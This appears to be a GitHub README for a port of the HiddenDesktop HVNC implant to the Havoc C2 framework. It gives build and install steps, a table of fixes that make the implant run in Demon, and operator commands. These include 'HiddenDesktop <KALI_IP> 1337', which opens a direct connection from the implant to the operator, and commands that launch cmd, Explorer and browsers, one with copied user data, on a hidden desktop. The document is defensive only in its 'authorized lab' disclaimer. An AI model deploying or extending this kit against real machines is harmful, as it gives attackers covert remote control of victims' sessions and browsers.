# havoc-hiddendesktop

Working **Havoc** port of [WKL-Sec/HiddenDesktop](https://github.com/WKL-Sec/HiddenDesktop) (HVNC / hidden WinStation desktop).

The 2023 CS BOF is a good idea with a loader that **does not run on Havoc**. This tree is the lab-fixed operator kit: implant BOF + `hidden-desktop.py` + `HVNC Server.exe` (Wine on Kali).

**Authorized lab / red-team use only.**

Polish deep-dive: [`WRITEUP.md`](WRITEUP.md)

## Why not stock HiddenDesktop on Havoc

| Broken piece | What happens | Fix in this repo |
|---|---|---|
| `ld -r` BOF (`go` + `BofMain` blob) | CoffeeLdr: `Symbol not found: BofMain` | One `.text`; PIC copied to `VirtualAlloc` then called |
| `jmp` into PIC / run PIC from Coffee map | Demon process dies, no output | `VirtualAlloc` + `call` |
| `BeaconInjectProcess` | Havoc `NtCreateThreadEx(NULL)` never starts the HVNC thread | `CreateThread` on a PIC copy |
| `ConnectNamedPipe` (CS job 40) | Thread blocks forever, never `connect()` | Skip pipe wait |
| `rportfwd` | Teamserver `io.Copy` until EOF — no server→agent stream | **Direct TCP** implant → operator `IP:1337` |
| Server pairs clients by **source IP only** | Second session from same host is dropped | Reconnect resets the slot |
| `hd-launch notepad` | `CreateProcessA("notepad")` does not search PATH | `SearchPathA` + writable command line |
| `hd-launch calc` | Win10 calc is UWP → **real** desktop | Refused; use `mspaint` / `notepad` / `write` |
| `hd-launch-firefox` copying a live profile | Locks files, kills Demon | Empty `-profile` + `-no-remote` |

## Dependencies

Kali / operator:

```bash
sudo apt install -y mingw-w64 nasm python3 wine64
```

Target: domain **or workgroup** Windows with an **interactive logon** (console session). Do **not** run the HVNC BOF as SYSTEM / session 0.

## Build

```bash
git clone https://github.com/DonMorpheus/havoc-hiddendesktop.git
cd havoc-hiddendesktop
make x64
make server
```

Artifacts in `bin/`:

- `HiddenDesktop.x64.o` — implant BOF
- `HVNC Server.exe` — operator UI (Windows; run under **Wine** on Kali)
- `explorer.x64.o` `cmd.x64.o` `run.x64.o` `chrome.x64.o` `edge.x64.o` `firefox.x64.o` `generic.x64.o`
- `hidden-desktop.py` — Havoc Script Manager loader

## Install (Havoc)

1. Start the operator UI on Kali (listen **0.0.0.0:1337**):

```bash
# GUI on your DISPLAY
wine "bin/HVNC Server.exe"
```

You should see: `[+] Starting HVNC Server on Port: 1337`

2. Havoc GUI → **Scripts → Load Script** → `bin/hidden-desktop.py`  
   Havoc `exec()`s the file (**no `__file__`**). The loader searches:

   - `$HAVOC_HD_BIN`
   - `~/github/havoc-hiddendesktop/bin`
   - `~/tools/havoc-hiddendesktop/bin`
   - `~/tools/HiddenDesktop/bin`

3. Open an **Administrator / interactive** Demon (not SYSTEM).

4. Kali LAN IP must be reachable from the implant (example `192.168.0.111`). Windows **outbound** TCP 1337; Kali **inbound** 1337.

```text
HiddenDesktop <KALI_IP> 1337
```

Wait for `HD thread started port=1337 pid=...` and a Wine window **HVNC Operator UI**. Then:

```text
hd-launch-cmd
hd-launch-explorer
hd-launch notepad
hd-launch mspaint
hd-launch-firefox
hd-launch-chrome
```

Do **not** reload the Python script in the middle of a session (desktop name lives in process memory). Do **not** use Havoc `rportfwd` for this tool.

## Commands

| Command | What |
|---|---|
| `HiddenDesktop <ip> <port>` | Create hidden desktop, connect **direct** to operator HVNC |
| `hd-launch-cmd` | `cmd.exe` |
| `hd-launch-explorer` | Explorer (registry warning is OK) |
| `hd-launch-run` | Run dialog |
| `hd-launch notepad` | PATH-safe generic (`mspaint`, `write`, `powershell`) |
| `hd-launch-firefox` | Firefox `-no-remote`, **empty** profile |
| `hd-launch-chrome` | Chrome with copied user-data (heavy) |
| `hd-launch-edge` | Edge |

**Do not** `hd-launch calc` — UWP, visible to the user.

## Credits

- Original CS HiddenDesktop: [WKL-Sec/HiddenDesktop](https://github.com/WKL-Sec/HiddenDesktop) (MIT)
- TinyNuke / [Meltedd/HVNC](https://github.com/Meltedd/HVNC)
- Havoc CoffeeLdr / Demon socket code

Lab port and Havoc-specific fixes: **DonMorpheus**, 2026.
